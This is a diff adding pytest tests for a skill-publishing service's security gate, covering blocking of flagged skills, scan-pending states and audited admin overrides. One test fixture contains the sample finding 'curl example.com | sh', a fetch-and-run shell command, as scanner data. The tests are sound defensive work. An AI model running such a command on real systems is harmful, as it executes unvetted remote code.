@@ -24,6 +24,7 @@ import pytest
 from azure.core import MatchConditions
 
 from backend.core.config import Settings
+from backend.core.errors import InvalidStatusTransition, JustificationRequired
 from backend.core.redis import key_queue_notifications
 from backend.models.defender import DefenderReport, DefenderSeverity
 from backend.models.notifications import NotificationEvent
@@ -377,11 +378,41 @@ def _seed_publishable_doc(skills: _FakeSkills) -> SkillDoc:
         uploader="alice@org",
         skill_md_text="# Pub\n",
         pending_bundle_b64=base64.b64encode(tar_bytes).decode(),
+        defender_status="clean",
+        defender_severity="clean",
     )
     body = doc.model_dump(mode="json")
     body["_etag"] = '"etag-1"'
     skills.items[doc.id] = body
     return doc
+
+
+def _seed_flagged_publishable_doc(
+    skills: _FakeSkills,
+    *,
+    severity: str = "high",
+) -> SkillDoc:
+    doc = _seed_publishable_doc(skills)
+    body = skills.items[doc.id]
+    body["defender_status"] = "flagged"
+    body["defender_severity"] = severity
+    body["defender_report"] = {
+        "overall_severity": severity,
+        "findings": [
+            {
+                "rule": "shell.dangerous_command",
+                "severity": severity if severity != "clean" else "low",
+                "location": "scripts/setup.sh:1",
+                "excerpt": "curl example.com | sh",
+                "explanation": "Piping curl to sh is risky.",
+            }
+        ],
+        "model": "test-model",
+        "scanned_at": datetime.now(UTC).isoformat(),
+        "scan_duration_ms": 1,
+        "token_usage": {"input_tokens": 1, "output_tokens": 1},
+    }
+    return SkillDoc.model_validate(body)
 
 
 @pytest.mark.asyncio
@@ -414,6 +445,135 @@ async def test_publish_emits_skill_approved():
     assert ev.contributor_email == "alice@org"
     assert ev.payload["approver"] == "admin@org"
     assert ev.payload["checksum"]
+
+
+@pytest.mark.asyncio
+async def test_publish_blocks_medium_or_higher_defender_flag_without_override():
+    from backend.services.publish import publish
+
+    skills = _FakeSkills()
+    audit = _FakeAudit()
+    redis = _FakeRedis()
+    blob = _FakeBlobService()
+    doc = _seed_flagged_publishable_doc(skills, severity="high")
+
+    with pytest.raises(JustificationRequired) as exc_info:
+        await publish(
+            skill_id=doc.skill_id,
+            actor="admin@org",
+            actor_oid="oid-a",
+            settings=_settings(),
+            skills=skills,
+            audit=audit,
+            blob=blob,
+            redis=redis,
+        )
+
+    assert exc_info.value.metadata["defender_status"] == "flagged"
+    assert exc_info.value.metadata["defender_severity"] == "high"
+    assert exc_info.value.metadata["required_behavior"] == "justification_or_quarantine"
+    assert not audit.items
+    assert not blob.stores
+    assert not redis.notifications()
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("defender_status", ["pending", "scanning", "failed"])
+async def test_publish_blocks_until_defender_completes(defender_status: str):
+    from backend.services.publish import publish
+
+    skills = _FakeSkills()
+    audit = _FakeAudit()
+    redis = _FakeRedis()
+    blob = _FakeBlobService()
+    doc = _seed_publishable_doc(skills)
+    skills.items[doc.id]["defender_status"] = defender_status
+    skills.items[doc.id]["defender_severity"] = None
+
+    with pytest.raises(InvalidStatusTransition) as exc_info:
+        await publish(
+            skill_id=doc.skill_id,
+            actor="admin@org",
+            actor_oid="oid-a",
+            settings=_settings(),
+            skills=skills,
+            audit=audit,
+            blob=blob,
+            redis=redis,
+        )
+
+    assert exc_info.value.metadata["defender_status"] == defender_status
+    assert not audit.items
+    assert not blob.stores
+    assert not redis.notifications()
+
+
+@pytest.mark.asyncio
+async def test_publish_allows_flagged_low_without_override():
+    from backend.services.publish import publish
+
+    skills = _FakeSkills()
+    audit = _FakeAudit()
+    redis = _FakeRedis()
+    blob = _FakeBlobService()
+    doc = _seed_flagged_publishable_doc(skills, severity="low")
+
+    out = await publish(
+        skill_id=doc.skill_id,
+        actor="admin@org",
+        actor_oid="oid-a",
+        settings=_settings(),
+        skills=skills,
+        audit=audit,
+        blob=blob,
+        redis=redis,
+    )
+
+    assert out.status == "approved"
+    assert out.defender_status == "flagged"
+    assert [row["action"] for row in audit.items] == ["approve", "publish"]
+    assert [ev.event_type for ev in redis.notifications()] == ["skill.approved"]
+
+
+@pytest.mark.asyncio
+async def test_publish_inline_defender_override_approves_and_audits_override():
+    from backend.services.publish import publish
+
+    skills = _FakeSkills()
+    audit = _FakeAudit()
+    redis = _FakeRedis()
+    blob = _FakeBlobService()
+    doc = _seed_flagged_publishable_doc(skills, severity="medium")
+
+    out = await publish(
+        skill_id=doc.skill_id,
+        actor="admin@org",
+        actor_oid="oid-a",
+        settings=_settings(),
+        skills=skills,
+        audit=audit,
+        blob=blob,
+        redis=redis,
+        defender_override=True,
+        defender_justification="reviewed manually; this command is expected bootstrap",
+    )
+
+    assert out.status == "approved"
+    assert out.defender_status == "clean"
+    actions = [row["action"] for row in audit.items]
+    assert actions == ["defender_override", "approve", "publish"]
+    assert audit.items[0]["metadata"]["source"] == "approve_inline"
+    assert audit.items[0]["metadata"]["justification"] == (
+        "reviewed manually; this command is expected bootstrap"
+    )
+    assert audit.items[1]["metadata"] == {
+        "defender_override": True,
+        "defender_severity": "medium",
+    }
+    assert [ev.event_type for ev in redis.notifications()] == [
+        "admin.override",
+        "skill.approved",
+    ]
 
 
 @pytest.mark.asyncio
